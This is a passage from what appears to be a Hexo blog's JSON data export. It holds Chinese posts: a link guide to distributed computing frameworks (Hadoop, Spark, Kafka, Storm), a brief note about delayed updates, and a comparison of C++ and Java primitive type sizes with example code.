Kafka是一个快速、可扩展的、高吞吐、可容错的分布式发布订阅消息系统。Kafka具有高吞吐量、内置分区、支持数据副本和容错的特性，适合在大规模消息处理场景中使用。\n![](http://images.cnblogs.com/cnblogs_com/BYRans/761498/o_kfkArchi.png)\n\n生产者消费者模型\n![](https://kafka.apache.org/10/images/kafka-apis.png)\n[Apache kafka 工作原理介绍](https://www.ibm.com/developerworks/cn/opensource/os-cn-kafka/index.html)\n[Kafka快速开始](https://kafka.apache.org/documentation/#quickstart)(官方良心文档，最快的方式知道kafka是什么，它在干什么)\n[Kafka生产者编程](https://kafka.apache.org/0110/javadoc/org/apache/kafka/clients/producer/KafkaProducer.html)\n[Kafka生产者编程](https://github.com/bkimminich/apache-kafka-book-examples/blob/master/src/test/kafka/SimpleProducer.java)\n[Kafka消费者编程](https://kafka.apache.org/0110/javadoc/index.html?org/apache/kafka/clients/consumer/KafkaConsumer.html)\n[Kafka消费者编程](https://github.com/bkimminich/apache-kafka-book-examples/blob/master/src/test/kafka/consumer/SimpleHLConsumer.java)\n[Kafka流式计算API](https://kafka.apache.org/documentation/streams/)\n\n### Storm\nApache Storm是一种侧重于极低延迟的流处理框架，也许是要求近实时处理的工作负载的最佳选择。该技术可处理非常大量的数据，通过比其他解决方案更低的延迟提供结果。\nStorm 顶级抽象图\n![](http://storm.apache.org/images/storm-flow.png)\n\n![](http://7xir15.com1.z0.glb.clouddn.com/storm%E7%BB%84%E4%BB%B6.PNG)\n\n[Storm官方概念](http://storm.apache.org/releases/1.1.1/Concepts.html)\n[Storm官方实例代码](https://github.com/apache/storm/tree/master/examples/storm-starter)\n[Storm示例代码](https://github.com/fenlan/storm-test/tree/master/src/main/java)\n[Storm优秀博客](https://ieevee.com/tech/2015/05/11/storm-intro.html)\n\n# 工作室产出文章\nhadoop安装[http://fenlan.github.io/2017/09/22/hadoop/#more](http://fenlan.github.io/2017/09/22/hadoop/#more)\nKafka安装[http://fenlan.github.io/2017/11/29/zookeeper-kafka/#more](http://fenlan.github.io/2017/11/29/zookeeper-kafka/#more)","source":"_posts/分布式计算.md","raw":"---\ntitle: 分布式计算\ndate: 2017-11-30 15:44:18\ncategories: 分布式计算\ntags:\n  - hadoop\n  - Kafka\n  - storm\n  - spark\n---\n\n# 大数据知识图谱\n![](http://angelof7.github.io/album/bigdata.gif)\n\n<!--more-->\n# 分布式计算\n\n## 经典计算模型MapReduce\n[MapReduce论文](https://static.googleusercontent.com/media/research.google.com/en//archive/mapreduce-osdi04.pdf)\n[MapReduce编程](http://hadoop.apache.org/docs/r2.8.2/hadoop-mapreduce-client/hadoop-mapreduce-client-core/MapReduceTutorial.html)\n[基于 MapReduce 的并行计算框架](https://www.ibm.com/developerworks/cn/analytics/library/ba-1507-mapreducefiveframes/index.html)\n\n## 开源计算框架\n\n### hadoop\nApache Hadoop 是用于开发在分布式计算环境中执行的数据处理应用程序的框架。类似于在个人计算机系统的本地文件系统的数据，在 Hadoop 数据保存在被称为作为Hadoop分布式文件系统的分布式文件系统。处理模型是基于“数据局部性”的概念，其中的计算逻辑被发送到包含数据的集群节点(服务器)。这个计算逻辑不过是写在编译的高级语言程序，例如 Java. 这样的程序来处理Hadoop 存储 的 HDFS 数据。\nHadoop是一个开源软件框架。使用Hadoop构建的应用程序都分布在集群计算机商业大型数据集上运行。商业电脑便宜并广泛使用。这些主要是在低成本计算上实现更大的计算能力非常有用。计算机集群由一组多个处理单元(存储磁盘+处理器)，其被连接到彼此，并作为一个单一的系统。\n![](http://cdn.guru99.com/images/Big_Data/061114_0803_LearnHadoop4.png)\n\n[官网教程](http://hadoop.apache.org/docs/r2.8.2/)\n[中文文档](https://hadoop.apache.org/docs/r1.0.4/cn/quickstart.html)\n\n### spark\nSpark是基于内存计算的大数据并行计算框架.Spark基于内存计算，提高了在大数据环境下数据处理的实时性,同时保证了高容错性和高可伸缩性,允许用户将Spark部署在大量的廉价硬件之上,形成集群。\nSpark是MapReduce的替代方案，而且兼容HDFS、Hive等分布式存储层，可融入\nHadoop的生态系统，以弥补缺失MapReduce的不足\n![](http://upload-images.jianshu.io/upload_images/3661808-6dcd3a79aba8bbd7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n[官方良心文档](https://spark.apache.org/docs/latest/quick-start.html)\n[中文文档](http://spark.apachecn.org/docs/cn/2.2.0/quick-start.html)\n[编程指导](https://spark.apache.org/docs/latest/rdd-programming-guide.html)\n[流式编程](https://spark.apache.org/docs/latest/streaming-programming-guide.html)\n\n### kafka\nApache Kafka发源于LinkedIn，于2011年成为Apache的孵化项目，随后于2012年成为Apache的主要项目之一。Kafka使用Scala和Java进行编写。Apache Kafka是一个快速、可扩展的、高吞吐、可容错的分布式发布订阅消息系统。Kafka具有高吞吐量、内置分区、支持数据副本和容错的特性，适合在大规模消息处理场景中使用。\n![](http://images.cnblogs.com/cnblogs_com/BYRans/761498/o_kfkArchi.png)\n\n生产者消费者模型\n![](https://kafka.apache.org/10/images/kafka-apis.png)\n[Apache kafka 工作原理介绍](https://www.ibm.com/developerworks/cn/opensource/os-cn-kafka/index.html)\n[Kafka快速开始](https://kafka.apache.org/documentation/#quickstart)(官方良心文档，最快的方式知道kafka是什么，它在干什么)\n[Kafka生产者编程](https://kafka.apache.org/0110/javadoc/org/apache/kafka/clients/producer/KafkaProducer.html)\n[Kafka生产者编程](https://github.com/bkimminich/apache-kafka-book-examples/blob/master/src/test/kafka/SimpleProducer.java)\n[Kafka消费者编程](https://kafka.apache.org/0110/javadoc/index.html?org/apache/kafka/clients/consumer/KafkaConsumer.html)\n[Kafka消费者编程](https://github.com/bkimminich/apache-kafka-book-examples/blob/master/src/test/kafka/consumer/SimpleHLConsumer.java)\n[Kafka流式计算API](https://kafka.apache.org/documentation/streams/)\n\n### Storm\nApache Storm是一种侧重于极低延迟的流处理框架，也许是要求近实时处理的工作负载的最佳选择。该技术可处理非常大量的数据，通过比其他解决方案更低的延迟提供结果。\nStorm 顶级抽象图\n![](http://storm.apache.org/images/storm-flow.png)\n\n![](http://7xir15.com1.z0.glb.clouddn.com/storm%E7%BB%84%E4%BB%B6.PNG)\n\n[Storm官方概念](http://storm.apache.org/releases/1.1.1/Concepts.html)\n[Storm官方实例代码](https://github.com/apache/storm/tree/master/examples/storm-starter)\n[Storm示例代码](https://github.com/fenlan/storm-test/tree/master/src/main/java)\n[Storm优秀博客](https://ieevee.com/tech/2015/05/11/storm-intro.html)\n\n# 工作室产出文章\nhadoop安装[http://fenlan.github.io/2017/09/22/hadoop/#more](http://fenlan.github.io/2017/09/22/hadoop/#more)\nKafka安装[http://fenlan.github.io/2017/11/29/zookeeper-kafka/#more](http://fenlan.github.io/2017/11/29/zookeeper-kafka/#more)","slug":"分布式计算","published":1,"updated":"2017-11-30T12:02:42.835Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgrjsd09003gyp0ld5noebew","content":"<h1 id=\"大数据知识图谱\"><a href=\"#大数据知识图谱\" class=\"headerlink\" title=\"大数据知识图谱\"></a>大数据知识图谱</h1><p><img src=\"http://angelof7.github.io/album/bigdata.gif\" alt=\"\"></p>\n<a id=\"more\"></a>\n<h1 id=\"分布式计算\"><a href=\"#分布式计算\" class=\"headerlink\" title=\"分布式计算\"></a>分布式计算</h1><h2 id=\"经典计算模型MapReduce\"><a href=\"#经典计算模型MapReduce\" class=\"headerlink\" title=\"经典计算模型MapReduce\"></a>经典计算模型MapReduce</h2><p><a href=\"https://static.googleusercontent.com/media/research.google.com/en//archive/mapreduce-osdi04.pdf\" target=\"_blank\" rel=\"external\">MapReduce论文</a><br><a href=\"http://hadoop.apache.org/docs/r2.8.2/hadoop-mapreduce-client/hadoop-mapreduce-client-core/MapReduceTutorial.html\" target=\"_blank\" rel=\"external\">MapReduce编程</a><br><a href=\"https://www.ibm.com/developerworks/cn/analytics/library/ba-1507-mapreducefiveframes/index.html\" target=\"_blank\" rel=\"external\">基于 MapReduce 的并行计算框架</a></p>\n<h2 id=\"开源计算框架\"><a href=\"#开源计算框架\" class=\"headerlink\" title=\"开源计算框架\"></a>开源计算框架</h2><h3 id=\"hadoop\"><a href=\"#hadoop\" class=\"headerlink\" title=\"hadoop\"></a>hadoop</h3><p>Apache Hadoop 是用于开发在分布式计算环境中执行的数据处理应用程序的框架。类似于在个人计算机系统的本地文件系统的数据，在 Hadoop 数据保存在被称为作为Hadoop分布式文件系统的分布式文件系统。处理模型是基于“数据局部性”的概念，其中的计算逻辑被发送到包含数据的集群节点(服务器)。这个计算逻辑不过是写在编译的高级语言程序，例如 Java. 这样的程序来处理Hadoop 存储 的 HDFS 数据。<br>Hadoop是一个开源软件框架。使用Hadoop构建的应用程序都分布在集群计算机商业大型数据集上运行。商业电脑便宜并广泛使用。这些主要是在低成本计算上实现更大的计算能力非常有用。计算机集群由一组多个处理单元(存储磁盘+处理器)，其被连接到彼此，并作为一个单一的系统。<br><img src=\"http://cdn.guru99.com/images/Big_Data/061114_0803_LearnHadoop4.png\" alt=\"\"></p>\n<p><a href=\"http://hadoop.apache.org/docs/r2.8.2/\" target=\"_blank\" rel=\"external\">官网教程</a><br><a href=\"https://hadoop.apache.org/docs/r1.0.4/cn/quickstart.html\" target=\"_blank\" rel=\"external\">中文文档</a></p>\n<h3 id=\"spark\"><a href=\"#spark\" class=\"headerlink\" title=\"spark\"></a>spark</h3><p>Spark是基于内存计算的大数据并行计算框架.Spark基于内存计算，提高了在大数据环境下数据处理的实时性,同时保证了高容错性和高可伸缩性,允许用户将Spark部署在大量的廉价硬件之上,形成集群。<br>Spark是MapReduce的替代方案，而且兼容HDFS、Hive等分布式存储层，可融入<br>Hadoop的生态系统，以弥补缺失MapReduce的不足<br><img src=\"http://upload-images.jianshu.io/upload_images/3661808-6dcd3a79aba8bbd7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\" alt=\"\"></p>\n<p><a href=\"https://spark.apache.org/docs/latest/quick-start.html\" target=\"_blank\" rel=\"external\">官方良心文档</a><br><a href=\"http://spark.apachecn.org/docs/cn/2.2.0/quick-start.html\" target=\"_blank\" rel=\"external\">中文文档</a><br><a href=\"https://spark.apache.org/docs/latest/rdd-programming-guide.html\" target=\"_blank\" rel=\"external\">编程指导</a><br><a href=\"https://spark.apache.org/docs/latest/streaming-programming-guide.html\" target=\"_blank\" rel=\"external\">流式编程</a></p>\n<h3 id=\"kafka\"><a href=\"#kafka\" class=\"headerlink\" title=\"kafka\"></a>kafka</h3><p>Apache Kafka发源于LinkedIn，于2011年成为Apache的孵化项目，随后于2012年成为Apache的主要项目之一。Kafka使用Scala和Java进行编写。Apache Kafka是一个快速、可扩展的、高吞吐、可容错的分布式发布订阅消息系统。Kafka具有高吞吐量、内置分区、支持数据副本和容错的特性，适合在大规模消息处理场景中使用。<br><img src=\"http://images.cnblogs.com/cnblogs_com/BYRans/761498/o_kfkArchi.png\" alt=\"\"></p>\n<p>生产者消费者模型<br><img src=\"https://kafka.apache.org/10/images/kafka-apis.png\" alt=\"\"><br><a href=\"https://www.ibm.com/developerworks/cn/opensource/os-cn-kafka/index.html\" target=\"_blank\" rel=\"external\">Apache kafka 工作原理介绍</a><br><a href=\"https://kafka.apache.org/documentation/#quickstart\" target=\"_blank\" rel=\"external\">Kafka快速开始</a>(官方良心文档，最快的方式知道kafka是什么，它在干什么)<br><a href=\"https://kafka.apache.org/0110/javadoc/org/apache/kafka/clients/producer/KafkaProducer.html\" target=\"_blank\" rel=\"external\">Kafka生产者编程</a><br><a href=\"https://github.com/bkimminich/apache-kafka-book-examples/blob/master/src/test/kafka/SimpleProducer.java\" target=\"_blank\" rel=\"external\">Kafka生产者编程</a><br><a href=\"https://kafka.apache.org/0110/javadoc/index.html?org/apache/kafka/clients/consumer/KafkaConsumer.html\" target=\"_blank\" rel=\"external\">Kafka消费者编程</a><br><a href=\"https://github.com/bkimminich/apache-kafka-book-examples/blob/master/src/test/kafka/consumer/SimpleHLConsumer.java\" target=\"_blank\" rel=\"external\">Kafka消费者编程</a><br><a href=\"https://kafka.apache.org/documentation/streams/\" target=\"_blank\" rel=\"external\">Kafka流式计算API</a></p>\n<h3 id=\"Storm\"><a href=\"#Storm\" class=\"headerlink\" title=\"Storm\"></a>Storm</h3><p>Apache Storm是一种侧重于极低延迟的流处理框架，也许是要求近实时处理的工作负载的最佳选择。该技术可处理非常大量的数据，通过比其他解决方案更低的延迟提供结果。<br>Storm 顶级抽象图<br><img src=\"http://storm.apache.org/images/storm-flow.png\" alt=\"\"></p>\n<p><img src=\"http://7xir15.com1.z0.glb.clouddn.com/storm%E7%BB%84%E4%BB%B6.PNG\" alt=\"\"></p>\n<p><a href=\"http://storm.apache.org/releases/1.1.1/Concepts.html\" target=\"_blank\" rel=\"external\">Storm官方概念</a><br><a href=\"https://github.com/apache/storm/tree/master/examples/storm-starter\" target=\"_blank\" rel=\"external\">Storm官方实例代码</a><br><a href=\"https://github.com/fenlan/storm-test/tree/master/src/main/java\" target=\"_blank\" rel=\"external\">Storm示例代码</a><br><a href=\"https://ieevee.com/tech/2015/05/11/storm-intro.html\" target=\"_blank\" rel=\"external\">Storm优秀博客</a></p>\n<h1 id=\"工作室产出文章\"><a href=\"#工作室产出文章\" class=\"headerlink\" title=\"工作室产出文章\"></a>工作室产出文章</h1><p>hadoop安装<a href=\"http://fenlan.github.io/2017/09/22/hadoop/#more\">http://fenlan.github.io/2017/09/22/hadoop/#more</a><br>Kafka安装<a href=\"http://fenlan.github.io/2017/11/29/zookeeper-kafka/#more\">http://fenlan.github.io/2017/11/29/zookeeper-kafka/#more</a></p>\n","excerpt":"<h1 id=\"大数据知识图谱\"><a href=\"#大数据知识图谱\" class=\"headerlink\" title=\"大数据知识图谱\"></a>大数据知识图谱</h1><p><img src=\"http://angelof7.github.io/album/bigdata.gif\" alt=\"\"></p>","more":"<h1 id=\"分布式计算\"><a href=\"#分布式计算\" class=\"headerlink\" title=\"分布式计算\"></a>分布式计算</h1><h2 id=\"经典计算模型MapReduce\"><a href=\"#经典计算模型MapReduce\" class=\"headerlink\" title=\"经典计算模型MapReduce\"></a>经典计算模型MapReduce</h2><p><a href=\"https://static.googleusercontent.com/media/research.google.com/en//archive/mapreduce-osdi04.pdf\">MapReduce论文</a><br><a href=\"http://hadoop.apache.org/docs/r2.8.2/hadoop-mapreduce-client/hadoop-mapreduce-client-core/MapReduceTutorial.html\">MapReduce编程</a><br><a href=\"https://www.ibm.com/developerworks/cn/analytics/library/ba-1507-mapreducefiveframes/index.html\">基于 MapReduce 的并行计算框架</a></p>\n<h2 id=\"开源计算框架\"><a href=\"#开源计算框架\" class=\"headerlink\" title=\"开源计算框架\"></a>开源计算框架</h2><h3 id=\"hadoop\"><a href=\"#hadoop\" class=\"headerlink\" title=\"hadoop\"></a>hadoop</h3><p>Apache Hadoop 是用于开发在分布式计算环境中执行的数据处理应用程序的框架。类似于在个人计算机系统的本地文件系统的数据，在 Hadoop 数据保存在被称为作为Hadoop分布式文件系统的分布式文件系统。处理模型是基于“数据局部性”的概念，其中的计算逻辑被发送到包含数据的集群节点(服务器)。这个计算逻辑不过是写在编译的高级语言程序，例如 Java. 这样的程序来处理Hadoop 存储 的 HDFS 数据。<br>Hadoop是一个开源软件框架。使用Hadoop构建的应用程序都分布在集群计算机商业大型数据集上运行。商业电脑便宜并广泛使用。这些主要是在低成本计算上实现更大的计算能力非常有用。计算机集群由一组多个处理单元(存储磁盘+处理器)，其被连接到彼此，并作为一个单一的系统。<br><img src=\"http://cdn.guru99.com/images/Big_Data/061114_0803_LearnHadoop4.png\" alt=\"\"></p>\n<p><a href=\"http://hadoop.apache.org/docs/r2.8.2/\">官网教程</a><br><a href=\"https://hadoop.apache.org/docs/r1.0.4/cn/quickstart.html\">中文文档</a></p>\n<h3 id=\"spark\"><a href=\"#spark\" class=\"headerlink\" title=\"spark\"></a>spark</h3><p>Spark是基于内存计算的大数据并行计算框架.Spark基于内存计算，提高了在大数据环境下数据处理的实时性,同时保证了高容错性和高可伸缩性,允许用户将Spark部署在大量的廉价硬件之上,形成集群。<br>Spark是MapReduce的替代方案，而且兼容HDFS、Hive等分布式存储层，可融入<br>Hadoop的生态系统，以弥补缺失MapReduce的不足<br><img src=\"http://upload-images.jianshu.io/upload_images/3661808-6dcd3a79aba8bbd7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\" alt=\"\"></p>\n<p><a href=\"https://spark.apache.org/docs/latest/quick-start.html\">官方良心文档</a><br><a href=\"http://spark.apachecn.org/docs/cn/2.2.0/quick-start.html\">中文文档</a><br><a href=\"https://spark.apache.org/docs/latest/rdd-programming-guide.html\">编程指导</a><br><a href=\"https://spark.apache.org/docs/latest/streaming-programming-guide.html\">流式编程</a></p>\n<h3 id=\"kafka\"><a href=\"#kafka\" class=\"headerlink\" title=\"kafka\"></a>kafka</h3><p>Apache Kafka发源于LinkedIn，于2011年成为Apache的孵化项目，随后于2012年成为Apache的主要项目之一。Kafka使用Scala和Java进行编写。Apache Kafka是一个快速、可扩展的、高吞吐、可容错的分布式发布订阅消息系统。Kafka具有高吞吐量、内置分区、支持数据副本和容错的特性，适合在大规模消息处理场景中使用。<br><img src=\"http://images.cnblogs.com/cnblogs_com/BYRans/761498/o_kfkArchi.png\" alt=\"\"></p>\n<p>生产者消费者模型<br><img src=\"https://kafka.apache.org/10/images/kafka-apis.png\" alt=\"\"><br><a href=\"https://www.ibm.com/developerworks/cn/opensource/os-cn-kafka/index.html\">Apache kafka 工作原理介绍</a><br><a href=\"https://kafka.apache.org/documentation/#quickstart\">Kafka快速开始</a>(官方良心文档，最快的方式知道kafka是什么，它在干什么)<br><a href=\"https://kafka.apache.org/0110/javadoc/org/apache/kafka/clients/producer/KafkaProducer.html\">Kafka生产者编程</a><br><a href=\"https://github.com/bkimminich/apache-kafka-book-examples/blob/master/src/test/kafka/SimpleProducer.java\">Kafka生产者编程</a><br><a href=\"https://kafka.apache.org/0110/javadoc/index.html?org/apache/kafka/clients/consumer/KafkaConsumer.html\">Kafka消费者编程</a><br><a href=\"https://github.com/bkimminich/apache-kafka-book-examples/blob/master/src/test/kafka/consumer/SimpleHLConsumer.java\">Kafka消费者编程</a><br><a href=\"https://kafka.apache.org/documentation/streams/\">Kafka流式计算API</a></p>\n<h3 id=\"Storm\"><a href=\"#Storm\" class=\"headerlink\" title=\"Storm\"></a>Storm</h3><p>Apache Storm是一种侧重于极低延迟的流处理框架，也许是要求近实时处理的工作负载的最佳选择。该技术可处理非常大量的数据，通过比其他解决方案更低的延迟提供结果。<br>Storm 顶级抽象图<br><img src=\"http://storm.apache.org/images/storm-flow.png\" alt=\"\"></p>\n<p><img src=\"http://7xir15.com1.z0.glb.clouddn.com/storm%E7%BB%84%E4%BB%B6.PNG\" alt=\"\"></p>\n<p><a href=\"http://storm.apache.org/releases/1.1.1/Concepts.html\">Storm官方概念</a><br><a href=\"https://github.com/apache/storm/tree/master/examples/storm-starter\">Storm官方实例代码</a><br><a href=\"https://github.com/fenlan/storm-test/tree/master/src/main/java\">Storm示例代码</a><br><a href=\"https://ieevee.com/tech/2015/05/11/storm-intro.html\">Storm优秀博客</a></p>\n<h1 id=\"工作室产出文章\"><a href=\"#工作室产出文章\" class=\"headerlink\" title=\"工作室产出文章\"></a>工作室产出文章</h1><p>hadoop安装<a href=\"http://fenlan.github.io/2017/09/22/hadoop/#more\">http://fenlan.github.io/2017/09/22/hadoop/#more</a><br>Kafka安装<a href=\"http://fenlan.github.io/2017/11/29/zookeeper-kafka/#more\">http://fenlan.github.io/2017/11/29/zookeeper-kafka/#more</a></p>"},{"title":"拖更。。。。。","date":"2016-05-30T07:18:23.000Z","_content":"**最近游手好闲，又开始浪了，感觉最近没什么时间啊，主要是课程脱节了，马上又要期末考试了，所以可能要托更一段时间。下一步可能要搭建自己的服务器，嗯嗯，是这样，不过具体什么时候开始，不知道，先挖个坑把，慢慢填**","source":"_posts/拖更.md","raw":"---\ntitle: 拖更。。。。。\ndate: 2016-05-30 15:18:23\n---\n**最近游手好闲，又开始浪了，感觉最近没什么时间啊，主要是课程脱节了，马上又要期末考试了，所以可能要托更一段时间。下一步可能要搭建自己的服务器，嗯嗯，是这样，不过具体什么时候开始，不知道，先挖个坑把，慢慢填**","slug":"拖更","published":1,"updated":"2017-11-21T10:01:13.601Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgrjsd0a003jyp0la8wvbfnb","content":"<p><strong>最近游手好闲，又开始浪了，感觉最近没什么时间啊，主要是课程脱节了，马上又要期末考试了，所以可能要托更一段时间。下一步可能要搭建自己的服务器，嗯嗯，是这样，不过具体什么时候开始，不知道，先挖个坑把，慢慢填</strong></p>\n","excerpt":"","more":"<p><strong>最近游手好闲，又开始浪了，感觉最近没什么时间啊，主要是课程脱节了，马上又要期末考试了，所以可能要托更一段时间。下一步可能要搭建自己的服务器，嗯嗯，是这样，不过具体什么时候开始，不知道，先挖个坑把，慢慢填</strong></p>\n"},{"title":"C++ Java基本类型size问题","date":"2018-04-08T07:18:23.000Z","_content":"\n鉴于之前多次面试题考察基本类型大小问题，今天来做个记录。\n\n## C++\nC++的基本类型有`bool` `char` `short` `float` `double` `int` `long` `long long` `pointer(指针)`\n\n| 数据类型 | 32位系统字节数 | 32系统二进制位数 | 64位系统字节数 | 64位系统二进制位数 |\n|--------|--------| -------- | -------- | -------- |\n| bool   |   1    |     8    |    1     |     8    |\n| char   |   1    |     8    |    1     |     8    |\n| short  |   2    |    16    |    2     |    16    |\n| int    |   4    |    32    |    4     |    32    |\n| long   |   4    |    32    |    8     |    64    |\n| long long |8    |    64    |    8     |    64    |\n| float  |   4    |    32    |    4     |    32    |\n| double |   8    |    64    |    8     |    64    |\n| pointer|   4    |    32    |    8     |    64    |\n\n可以看出其中只有`long` `pointer`是不同的，32位平台32位，64位平台64位，其实`pointer`就是用`long`表示的\n<!--more-->\n``` cpp\n#include <iostream>\nusing namespace std;\n\nint main()\n{\n\tcout << \"bool      sizeof : \" << sizeof(bool) << endl;\n\tcout << \"char      sizeof : \" << sizeof(char) << endl;\n\tcout << \"short     sizeof : \" << sizeof(short) << endl;\n\tcout << \"int       sizeof : \" << sizeof(int) << endl;\n\tcout << \"long      sizeof : \" << sizeof(long) << endl;\n\tcout << \"long long sizeof : \" << sizeof(long long) << endl;\n\tcout << \"float     sizeof : \" << sizeof(float) << endl;\n\tcout << \"double    sizeof : \" << sizeof(double) << endl;\n\tcout << \"pointer   sizeof : \" << sizeof(void *) << endl;\n\treturn 0;\n}\n```\n64位linux输出结果\n``` cpp\nbool      sizeof : 1\nchar      sizeof : 1\nshort     sizeof : 2\nint       sizeof : 4\nlong      sizeof : 8\nlong long sizeof : 8\nfloat     sizeof : 4\ndouble    sizeof : 8\npointer   sizeof : 8\n```\n\n## Java\nJava的基本类型有`boolean` `char` `short` `float` `double` `int` `long` `byte`, Java中的基本类型大小是固定的，与操作平台位数无关\n\n| 数据类型 | 字节数 | 二进制位数 |\n|--------|--------| -------- |\n| boolen |   1    |     8    |\n| byte   |   1    |     8    |\n| char   |   2    |    16    |\n| short  |   2    |    16    |\n| int    |   4    |    32    |\n| long   |   8    |    64    |\n| float  |   4    |    32    |\n| double |   8    |    64    |\n\n值得注意的是Java中的`char`类型占两个字节，而C++中只占一个字节。`char`在Java中是16位的，因为Java用的是`Unicode`。不过8位的ASCII码包含在`Unicode`中，是从0~127的。至于为什么，这里留下一点故事 ：\n\nJava中使用Unicode的原因是，Java的Applet允许全世界范围内运行，那它就需要一种可以表述人类所有语言的字符编码。Unicode。但是English，Spanish，German, French根本不需要这么表示，所以它们其实采用ASCII码会更高效。这中间就存在一个权衡问题。\n那么是不是该好奇中文字应该占多少字节，这个不同的编码不一样，通常在2-4个字节：\n- `GBK`编码，一个汉字占两个字节\n- `UTF-16`编码，通常汉字占两个字节\n- `CJKV`扩展B区、扩展C区、扩展D区中的汉字占四个字节（一般字符的Unicode范围是U+0000至U+FFFF，而这些扩展部分的范围大于U+20000，因而要用两个UTF-16）\n- `UTF-8`编码是变长编码，通常汉字占三个字节，扩展B区以后的汉字占四个字节\n\n``` Java\npublic class TypeSize {\n\n    public static void main(String[] args) {\n        System.out.println(\"byte      sizeof : \" + Byte.SIZE);\n        System.out.println(\"char      sizeof : \" + Character.SIZE);\n        System.out.println(\"short     sizeof : \" + Short.SIZE);\n        System.out.println(\"int       sizeof : \" + Integer.SIZE);\n        System.out.println(\"long      sizeof : \" + Long.SIZE);\n        System.out.println(\"float     sizeof : \" + Float.SIZE);\n        System.out.println(\"double    sizeof : \" + Double.SIZE);\n    }\n}\n```\n\n输出结果\n``` Java\nbyte      sizeof : 8\nchar      sizeof : 16\nshort     sizeof : 16\nint       sizeof : 32\nlong      sizeof : 64\nfloat     sizeof : 32\ndouble    sizeof : 64\n```","source":"_posts/基本类型.md","raw":"---\ntitle: C++ Java基本类型size问题\ndate: 2018-04-08 15:18:23\ncategories: Java\ntags:\n  - Java\n  - C++\n---\n\n鉴于之前多次面试题考察基本类型大小问题，今天来做个记录。\n\n## C++\nC++的基本类型有`bool` `char` `short` `float` `double` `int` `long` `long long` `pointer(指针)`\n\n| 数据类型 | 32位系统字节数 | 32系统二进制位数 | 64位系统字节数 | 64位系统二进制位数 |\n|--------|--------| -------- | -------- | -------- |\n| bool   |   1    |     8    |    1     |     8    |\n| char   |   1    |     8    |    1     |     8    |\n| short  |   2    |    16    |    2     |    16    |\n| int    |   4    |    32    |    4     |    32    |\n| long   |   4    |    32    |    8     |    64    |\n| long long |8    |    64    |    8     |    64    |\n| float  |   4    |    32    |    4     |    32    |\n| double |   8    |    64    |    8     |    64    |\n| pointer|   4    |    32    |    8     |    64    |\n\n可以看出其中只有`long` `pointer`是不同的，32位平台32位，64位平台64位，其实`pointer`就是用`long`表示的\n<!--more-->\n``` cpp\n#include <iostream>\nusing namespace std;\n\nint main()\n{\n\tcout << \"bool      sizeof : \" << sizeof(bool) << endl;\n\tcout << \"char      sizeof : \" << sizeof(char) << endl;\n\tcout << \"short     sizeof : \" << sizeof(short) << endl;\n\tcout << \"int       sizeof : \" << sizeof(int) << endl;\n\tcout << \"long      sizeof : \" << sizeof(long) << endl;\n\tcout << \"long long sizeof : \" << sizeof(long long) << endl;\n\tcout << \"float     sizeof : \" << sizeof(float) << endl;\n\tcout << \"double    sizeof : \" << sizeof(double) << endl;\n\tcout << \"pointer   sizeof : \" << sizeof(void *) << endl;\n\treturn 0;\n}\n```\n64位linux输出结果\n``` cpp\nbool      sizeof : 1\nchar      sizeof : 1\nshort     sizeof : 2\nint       sizeof : 4\nlong      sizeof : 8\nlong long sizeof : 8\nfloat     sizeof : 4\ndouble    sizeof : 8\npointer   sizeof : 8\n```\n\n## Java\nJava的基本类型有`boolean` `char` `short` `float` `double` `int` `long` `byte`, Java中的基本类型大小是固定的，与操作平台位数无关\n\n| 数据类型 | 字节数 | 二进制位数 |\n|--------|--------| -------- |\n| boolen |   1    |     8    |\n| byte   |   1    |     8    |\n| char   |   2    |    16    |\n| short  |   2    |    16    |\n| int    |   4    |    32    |\n| long   |   8    |    64    |\n| float  |   4    |    32    |\n| double |   8    |    64    |\n\n值得注意的是Java中的`char`类型占两个字节，而C++中只占一个字节。`char`在Java中是16位的，因为Java用的是`Unicode`。不过8位的ASCII码包含在`Unicode`中，是从0~127的。至于为什么，这里留下一点故事 ：\n\nJava中使用Unicode的原因是，Java的Applet允许全世界范围内运行，那它就需要一种可以表述人类所有语言的字符编码。Unicode。但是English，Spanish，German, French根本不需要这么表示，所以它们其实采用ASCII码会更高效。这中间就存在一个权衡问题。\n那么是不是该好奇中文字应该占多少字节，这个不同的编码不一样，通常在2-4个字节：\n- `GBK`编码，一个汉字占两个字节\n- `UTF-16`编码，通常汉字占两个字节\n- `CJKV`扩展B区、扩展C区、扩展D区中的汉字占四个字节（一般字符的Unicode范围是U+0000至U+FFFF，而这些扩展部分的范围大于U+20000，因而要用两个UTF-16）\n- `UTF-8`编码是变长编码，通常汉字占三个字节，扩展B区以后的汉字占四个字节\n\n``` Java\npublic class TypeSize {\n\n    public static void main(String[] args) {\n        System.out.println(\"byte      sizeof : \" + Byte.SIZE);\n        System.out.println(\"char      sizeof : \" + Character.SIZE);\n        System.out.println(\"short     sizeof : \" + Short.SIZE);\n        System.out.println(\"int       sizeof : \" + Integer.SIZE);\n        System.out.println(\"long      sizeof : \" + Long.SIZE);\n        System.out.println(\"float     sizeof : \" + Float.SIZE);\n        System.out.println(\"double    sizeof : \" + Double.SIZE);\n    }\n}\n```\n\n输出结果\n``` Java\nbyte      sizeof : 8\nchar      sizeof : 16\nshort     sizeof : 16\nint       sizeof : 32\nlong      sizeof : 64\nfloat     sizeof : 32\ndouble    sizeof : 64\n```","slug":"基本类型","published":1,"updated":"2018-04-08T08:51:06.196Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgrjsd0d003lyp0lxqlek4i9","content":"<p>鉴于之前多次面试题考察基本类型大小问题，今天来做个记录。</p>\n<h2 id=\"C\"><a href=\"#C\" class=\"headerlink\" title=\"C++\"></a>C++</h2><p>C++的基本类型有<code>bool</code> <code>char</code> <code>short</code> <code>float</code> <code>double</code> <code>int</code> <code>long</code> <code>long long</code> 